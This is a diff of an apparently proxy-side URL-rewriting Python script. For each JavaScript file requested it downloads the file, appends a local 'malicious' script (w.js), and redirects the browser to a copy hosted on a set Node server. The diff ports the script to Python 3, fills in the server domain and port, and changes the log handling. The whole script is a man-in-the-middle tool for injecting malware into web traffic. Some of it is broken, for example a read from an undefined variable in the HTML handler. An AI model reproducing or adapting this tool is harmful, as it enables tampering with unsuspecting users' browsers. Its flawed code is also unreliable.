@@ -1,4 +1,5 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
+
 from sys import argv,stdin,stdout
 from os import getpid
 import re
@@ -9,10 +10,12 @@ count = 0
 pid = str(getpid())
 pattern = r'\.js'
 senderpattern = r'\{ip\}'
-saveDirectory = "../public/js/" #should be webdir
+saveDirectory = "/generated_js/" #should be webdir
 maliciousJS = "w.js"
-newip = "this_public_ip_address"
-newport = "this_public_port"
+# Node JS server IP address
+newip = "test-domain.qpizzle.com"
+# Node JS server port
+newport = "3000"
 
 def processJS(old_url):
     global pid
@@ -22,18 +25,19 @@ def processJS(old_url):
     global line_list
     global newip
     global newport
-     logfile = '/tmp/rewrite_js_log' #for logging which files have been processed
-    with open(logfile,'a+') as log:
+    logfile = '/tmp/rewrite_js_log' #for logging which files have been processed
+    with open(logfile,'a') as log:
         log.write("[{}] targeted file {}\n".format(datetime.now(), old_url))
     newfilename = pid+'-'+str(count)+'.js'
     newfile = saveDirectory+newfilename
     call(["wget","-q","-O",newfile,old_url+str(port)])
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[{}] downloaded file {}\n".format(datetime.now(), old_url))
     call(["chmod","a+r",newfile])
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[{}] set perms on {}\n".format(datetime.now(), old_url))
     with open(newfile,"a") as f:
+
         #being lazy with javascript appending malware thing
         with open(saveDirectory+maliciousJS,"r") as j:
             if len(line_list) >= 2:
@@ -41,11 +45,11 @@ def processJS(old_url):
             else:
                 connector = "ERROR"
             f.write( re.sub(senderpattern,connector,j.read()) )
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[[{}] read and wrote {}\n".format(datetime.now(), old_url))
     call(["chmod","a+r",saveDirectory+maliciousJS])
-    stdout.write('https://{}:{}/html/{}\n'.format(newip,newport,newfilename))
-    with open(logfile,'a+') as log:
+    stdout.write('OK [status=30N] url="https://{}:{}/html/{}"\n'.format(newip,newport,newfilename))
+    with open(logfile,'a') as log:
         log.write("[{}] wrote file {} to {}\n".format(datetime.now(), old_url, newfilename ))    
 
 def processHTML(old_url):
@@ -57,30 +61,33 @@ def processHTML(old_url):
     global newip
     global newport
     logfile = '/tmp/rewrite_html_log'
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[{}] targeted file {}\n".format(datetime.now(), old_url))
     newfilename = pid+'-'+str(count)+old_url.rsplit('.',1)[1]
     newfile = saveDirectory+newfilename
     call(["wget","-q","-O",newfile,old_url+str(port)])
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[{}] downloaded file {} to {}\n".format(datetime.now(), old_url,newfile))
     call(["chmod","a+r",newfile])
-    logfile = '/tmp/rewrite_html_log'
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[{}] set perms on {}\n".format(datetime.now(), old_url))
     with open(newfile,"r+") as f:
         data = r.read()
         f.write( re.sub(r'http://',r'https://', data ))
-    with open(logfile,'a+') as log:
+    with open(logfile,'a') as log:
         log.write("[[{}] read and wrote {}\n".format(datetime.now(), old_url))
     call(["chmod","a+r",saveDirectory+maliciousJS])
-    stdout.write('https://{}:{}/js/{}\n'.format(newip,newport,newfilename))
+    
+    stdout.write('OK [status=30N] url="https://{}:{}/js/{}"\n'.format(newip,newport,newfilename))
+    
     with open(logfile,'a+') as log:
         log.write("[{}] wrote file {} to {}\n".format(datetime.now(), old_url, newfilename ))    
 
 
 while True:
     line = stdin.readline().strip()
+    if line == '': 
+        continue
     line_list = line.split(' ')
     old_url = line_list[0]
     port = '' 
